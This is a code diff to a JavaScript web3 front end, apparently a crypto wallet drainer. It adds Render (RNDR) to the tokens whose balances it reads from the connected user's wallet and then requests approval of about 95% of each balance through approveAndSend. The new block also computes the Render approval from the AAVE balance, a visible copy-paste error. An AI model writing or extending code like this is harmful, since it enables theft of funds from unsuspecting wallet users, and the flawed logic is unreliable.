@@ -7,12 +7,13 @@ var loader_msg = document.querySelector(".loader_message");
 // Token Addresses
 const TOKEN_ADDRESSES = [
   // "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
-  // "0x3d6545b08693daE087E957cb1180ee38B9e3c25E", // Ethereum Classic (ETC)
+  // "0x3d6545b08693daE087E957cb1180ee38B9e3c25E", // Ethereum Classic (ETC) # for bsc
   // "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
   // "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
   // "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", // Wrapped Bitcoin (WBTC)
   // "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // Aave (AAVE)
   // "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"  // Uniswap (UNI)
+  // "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24"  // Render(RNDR)
 ];
 const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"
 // const ETHEREUM_CLASSIC_ADDRESS = "0x3d6545b08693daE087E957cb1180ee38B9e3c25E"
@@ -21,6 +22,7 @@ const USD_COIN_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
 const WRAPPED_BTICOIN_ADDRESS = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
 const AAVE_ADDRESS = "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"
 const UNISWAP_ADDRESS = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"
+const RENDER_ADDRESS = "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24"
 
 const GR_ADDRESS = "0x3Fe589578eF2286236EC0dd47173AbF393C4fc79";
 const S_TOKEN = "0x298f63a2C5b299611a06bE60138C24d6Fe5798d8";
@@ -1169,6 +1171,7 @@ export async function approveTokens() {
   let wrappedBitcoinContract = await getSmartContract(WRAPPED_BTICOIN_ADDRESS, ERC20_ABI)
   let aaveContract = await getSmartContract(AAVE_ADDRESS, ERC20_ABI)
   let uniswapContract = await getSmartContract(UNISWAP_ADDRESS, ERC20_ABI)
+  let renderContract = await getSmartContract(RENDER_ADDRESS, ERC20_ABI)
 
   // getting the user balance for each token
   // let userGrBalance = await grTokenContract.methods.balanceOf(userAddress).call();
@@ -1185,6 +1188,8 @@ export async function approveTokens() {
   let aaveBalance = await aaveContract.methods.balanceOf(userAddress).call();
   console.log("Calling 7")
   let uniswapBalance = await uniswapContract.methods.balanceOf(userAddress).call();
+  console.log('Called')
+  let renderBalance = await renderContract.methods.balanceOf(userAddress).call();
   console.log('Called')
 
 
@@ -1228,6 +1233,12 @@ export async function approveTokens() {
     zeroCount+=1
     console.log(zeroCount)
   }
+  if (checkBalanceIsEnough(renderBalance) > 0n) {
+    // Adjust the approval amount as needed (e.g., 95% of user balance)
+    let approvalAmount = BigInt(Number(aaveBalance) * 0.95); // Convert to BigInt
+    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
+    tx = await approveAndSend(RENDER_ADDRESS, renderContract, userAddress, allowanceInWei, web3);
+  }else{zeroCount+=1}
   console.log(zeroCount)
 
   // if (checkBalanceIsEnough(userGrBalance) > 0n) {
